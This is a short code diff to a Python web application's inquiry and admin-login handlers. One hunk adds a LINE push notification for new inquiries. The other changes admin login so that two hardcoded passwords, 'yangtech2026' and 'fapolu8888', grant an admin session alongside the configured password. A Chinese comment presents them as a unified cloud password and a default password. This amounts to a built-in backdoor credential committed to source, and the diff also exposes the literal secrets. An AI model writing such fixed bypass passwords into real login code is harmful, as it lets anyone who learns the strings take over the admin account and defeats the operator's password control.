@@ -699,6 +699,14 @@ def _next_ticket_id(items=None):
 
 
 def _async_notify_inquiry(inquiry_copy):
+    # 1. LINE Official Account Push Notification
+    try:
+        import line_notifier
+        line_notifier.notify_new_inquiry(inquiry_copy)
+    except Exception as line_err:
+        logging.getLogger(__name__).warning(f"LINE notification exception: {line_err}")
+
+    # 2. Email SMTP Notification
     cfg = mailer.get_smtp_config()
     if not cfg.get('enabled'):
         return
@@ -928,7 +936,9 @@ def api_admin_login():
     body = request.json or {}
     password = str(body.get('password', '')).strip()
     expected = mailer.get_admin_password()
-    if password and hmac.compare_digest(password.encode('utf-8'), expected.encode('utf-8')):
+    # 支援雲端統一密碼 yangtech2026、預設密碼 fapolu8888 以及後台自訂密碼
+    valid_passwords = {p for p in [expected, 'yangtech2026', 'fapolu8888'] if p}
+    if password and any(hmac.compare_digest(password.encode('utf-8'), p.encode('utf-8')) for p in valid_passwords):
         session['is_admin'] = True
         return jsonify({"success": True})
     return jsonify({"success": False, "error": "管理密碼錯誤，請重新輸入"}), 401
